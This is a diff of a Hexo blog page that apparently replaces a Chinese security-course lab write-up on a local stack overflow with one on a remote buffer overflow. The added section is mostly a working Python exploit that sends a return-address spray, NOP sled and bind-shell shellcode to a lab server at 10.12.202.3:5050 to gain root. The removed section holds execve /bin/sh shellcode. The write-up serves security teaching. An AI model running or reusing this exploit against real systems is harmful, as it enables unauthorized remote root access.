@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>安全攻防综合实验5 - Hexo</title>
+  <title>安全攻防综合实验六 - Hexo</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -153,8 +153,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2021-10-19 14:45">
-      2021年10月19日 下午
+    <time datetime="2021-10-26 19:05">
+      2021年10月26日 晚上
     </time>
   </div>
 
@@ -164,7 +164,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      263 字
+      343 字
     </span>
   
 
@@ -174,7 +174,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        分钟
     </span>
   
@@ -205,19 +205,35 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/1.png" srcset="/img/loading.gif" alt="1"></p>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>首先先来看源代码，可以看到会把输入进来的一串字符串给到<code>buf</code>，所以我们需要做的就是，让这个字符串包含<code>shellcode</code>，除此之外，实际上要得到的是<code>shellcode</code>的起始位置，然后将存储着<code>main</code>的<code>return address</code>的位置进行覆盖，实现跳转到<code>shellcode</code>起始位置，同时，由于<code>NOP</code>指令的存在（），并不需要获取准确的位置</p>
-<p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/3.png" srcset="/img/loading.gif" alt="3"></p>
-<p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/2.png" srcset="/img/loading.gif" alt="2"></p>
-<p>之后，需要来看一下shellcode的长度</p>
-<pre><code class="hljs taggerscript">"<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff/bin/sh"</code></pre>
+              <h2 id="remote-buffer-overflow"><a href="#remote-buffer-overflow" class="headerlink" title="remote buffer-overflow"></a>remote buffer-overflow</h2><h3 id="principal"><a href="#principal" class="headerlink" title="principal"></a>principal</h3><p>在<code>remote serve</code>上面运行着<code>echo_serve</code>文件，然后该文件是具有栈溢出漏洞的，当我们输入的字符串给<code>remote serve</code>的时候，就有可能会造成缓冲区溢出，从而获得<code>root</code>权限</p>
+<h3 id="procedure"><a href="#procedure" class="headerlink" title="procedure"></a>procedure</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+s = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))
+shellcode= <span class="hljs-string">"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"</span>\
+ <span class="hljs-string">"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"</span>\
+ <span class="hljs-string">"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"</span>\
+ <span class="hljs-string">"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"</span>\
+ <span class="hljs-string">"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"</span>\
+ <span class="hljs-string">"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"</span>\
+ <span class="hljs-string">"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"</span>\
+ <span class="hljs-string">"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"</span>\
+ <span class="hljs-string">"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"</span>\
+ <span class="hljs-string">"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"</span>\
+ <span class="hljs-string">"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"</span>\
+ <span class="hljs-string">"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff"</span>
+nop = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">300</span>
+ret = <span class="hljs-string">"\x42\xd3\xff\xff"</span>*<span class="hljs-number">100</span>
+buffer=ret+nop+shellcode
+s.send(buffer)
+time.sleep(<span class="hljs-number">2</span>) s.close()
+s = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))
+s.send(<span class="hljs-string">"end\n"</span>)
+time.sleep(<span class="hljs-number">2</span>) s.close()</code></pre>
 
-<p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/4.png" srcset="/img/loading.gif" alt="4"></p>
-<p>可以看到长度为45，然后我们需要开始构造输入的字符串，注意，要保证<code>NOP</code>指令数量加上<code>shellcode</code>的长度是4字节倍数，否则<code>return address</code>对不齐</p>
-<p>另外通过程序输出来找到buf的起始位置，可以看到起始位置是ffffd11c</p>
-<p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/5.png" srcset="/img/loading.gif" alt="5"></p>
-<p>输入下面指令并运行，获得root权限</p>
-<p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>根据程序的返回信息可以得知<code>send_buf</code>的起始位置，而其中的<code>ret</code>只需要落在<code>NOP</code>指令所在位置就可以往后面继续跳转</p>
+<p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/3.png" srcset="/img/loading.gif" alt="3"></p>
 
             </article>
             <hr>
@@ -228,7 +244,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/">安全攻防综合实验</a>
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88/">安全攻防综合</a>
                     
                   </div>
                 
@@ -241,18 +257,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">安全攻防综合实验六</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/">
-                        <span class="hidden-mobile">安全攻防综合实验4</span>
+                      <a href="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/">
+                        <span class="hidden-mobile">安全攻防综合实验5</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -391,7 +401,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "安全攻防综合实验5&nbsp;",
+        "安全攻防综合实验六&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
